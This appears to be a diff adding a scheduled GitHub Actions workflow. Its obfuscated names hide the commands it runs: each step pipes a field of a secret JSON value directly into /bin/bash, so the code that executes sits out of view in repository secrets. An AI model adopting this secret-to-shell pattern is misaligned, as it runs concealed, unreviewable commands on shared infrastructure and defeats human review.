@@ -1,0 +1,19 @@
+name: shouchangkuoshao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shouchangkuoshao
+        env:
+          uodey3: ${{ secrets.uodey3 }}
+        run: |
+          echo $uodey3 | jq -r .sc097 | /bin/bash
+          echo $cwdur204 | jq -r .qa870 | /bin/bash
+          echo $gtd30 | jq -r .qjczb67107 | /bin/bash
+
